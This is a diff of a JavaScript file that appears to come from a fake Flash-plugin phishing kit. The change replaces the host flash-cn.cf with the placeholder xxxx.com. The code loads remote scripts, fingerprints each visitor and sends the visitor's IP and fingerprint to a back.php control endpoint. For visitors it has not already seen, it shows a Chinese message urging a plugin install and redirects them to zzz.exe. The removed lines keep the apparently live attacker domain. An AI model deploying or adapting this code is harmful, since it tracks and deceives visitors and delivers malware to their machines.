@@ -1,7 +1,7 @@
 var returnCitySN = {"cip": "0.0.0.0", "extend": "000000"};
 // document.write("<script src='http://pv.sohu.com/cityjson?ie=utf-8'></script>");
-document.write("<script src='http://flash-cn.cf/audio-fingerprinting.js'></script>")
-document.write("<script src='http://flash-cn.cf/back.php?getaddr=123'></script>");
+document.write("<script src='http://xxxx.com/audio-fingerprinting.js'></script>")
+document.write("<script src='http://xxxx.com/back.php?getaddr=123'></script>");
 
 
 //上线检测
@@ -17,7 +17,7 @@ function isRise(ip,extend) {
         function (fingerprint){
         // document.write(fingerprint);
         console.log(fingerprint);
-        xmlHttp.open("GET", "http://flash-cn.cf/back.php?search="+ip+fingerprint, "true");
+        xmlHttp.open("GET", "http://xxxx.com/back.php?search="+ip+fingerprint, "true");
         xmlHttp.send();
         xmlHttp.onreadystatechange = function() {
         //alert(xmlHttp.responseText)
@@ -25,8 +25,8 @@ function isRise(ip,extend) {
             var resData = xmlHttp.responseText;
             if (resData == "in" && extend == "111111") {
             } else {
-                document.write("<script src='http://flash-cn.cf/back.php?bite1=1'></script>");
-                xmlHttp.open("GET", "http://flash-cn.cf/back.php?ip="+ip+fingerprint, "true");
+                document.write("<script src='http://xxxx.com/back.php?bite1=1'></script>");
+                xmlHttp.open("GET", "http://xxxx.com/back.php?ip="+ip+fingerprint, "true");
                 xmlHttp.send();
                 xmlHttp.onreadystatechange = function() {
                 if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {} else {}}
@@ -41,7 +41,7 @@ function isRise(ip,extend) {
 //下载
 function download(){
     alert("请尝试下载并安装插件后访问本页面!");
-    window.location.href="http://flash-cn.cf/zzz.exe";
+    window.location.href="http://xxxx.com/zzz.exe";
 }
 
 //判断是否是PC
